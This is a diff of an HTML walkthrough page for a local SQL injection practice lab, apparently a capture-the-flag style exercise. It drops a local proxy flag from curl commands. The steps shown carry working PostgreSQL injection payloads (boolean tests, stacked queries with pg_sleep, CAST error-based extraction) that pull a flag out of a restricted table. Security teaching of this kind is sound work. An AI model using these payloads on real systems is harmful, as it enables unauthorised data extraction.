@@ -11,7 +11,7 @@
         <span class="terminal-title">Step 1. Baseline Test</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/pgsql/lab14" \<br> --data-urlencode "action=LOGIN"<br><br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/pgsql/lab14" \<br> --data-urlencode "action=LOGIN"<br><br>
         <span class="prompt">Response: </span>1 | LOGIN | Admin user logged in from 192.168.1.100 | 2026-03-23 10:45:08.354868
     </div>
 </div>
@@ -29,9 +29,9 @@
         <span class="terminal-title">Step 2. Injection Confirmation</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/pgsql/lab14" \<br> --data-urlencode "action=LOGIN' AND 1=1 -- -"<br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/pgsql/lab14" \<br> --data-urlencode "action=LOGIN' AND 1=1 -- -"<br>
         <span class="prompt">Response: </span>1 | LOGIN | Admin user logged in from 192.168.1.100 (TRUE condition)<br><br>
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/pgsql/lab14" \<br> --data-urlencode "action=LOGIN' AND 1=2 -- -"<br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/pgsql/lab14" \<br> --data-urlencode "action=LOGIN' AND 1=2 -- -"<br>
         <span class="prompt">Response: </span>No log entries found for that action type. (FALSE condition)
     </div>
 </div>
@@ -49,7 +49,7 @@
         <span class="terminal-title">Step 3. Stacked Query Confirmation</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>time curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/pgsql/lab14" \<br> --data-urlencode "action='; SELECT pg_sleep(2) -- -"<br><br>
+        <span class="prompt">$ </span>time curl -s "http://localhost/SQLi-Arena/pgsql/lab14" \<br> --data-urlencode "action='; SELECT pg_sleep(2) -- -"<br><br>
         <span class="prompt">Response: </span>(2-second delay confirmed -- stacked queries work!)<br>
         real    0m2.045s
     </div>
@@ -68,7 +68,7 @@
         <span class="terminal-title">Step 4. CAST Error Extraction</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/pgsql/lab14" \<br> --data-urlencode "action=' AND 1=CAST((SELECT secret_value FROM restricted_data LIMIT 1) AS INTEGER) -- -"<br><br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/pgsql/lab14" \<br> --data-urlencode "action=' AND 1=CAST((SELECT secret_value FROM restricted_data LIMIT 1) AS INTEGER) -- -"<br><br>
         <span class="prompt">Response: </span><strong>Query Error:</strong> ERROR:  invalid input syntax for type integer: "FLAG{pg_4lt3r_r0l3_pr1v3sc}"
     </div>
 </div>
@@ -87,7 +87,7 @@
         <span class="terminal-title">curl. Full Exploit</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/pgsql/lab14" \<br> --data-urlencode "action=' AND 1=CAST((SELECT secret_value FROM restricted_data LIMIT 1) AS INTEGER) -- -"<br><br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/pgsql/lab14" \<br> --data-urlencode "action=' AND 1=CAST((SELECT secret_value FROM restricted_data LIMIT 1) AS INTEGER) -- -"<br><br>
         <span class="prompt">Response: </span><strong>Query Error:</strong> ERROR:  invalid input syntax for type integer: "FLAG{pg_4lt3r_r0l3_pr1v3sc}"
     </div>
 </div>
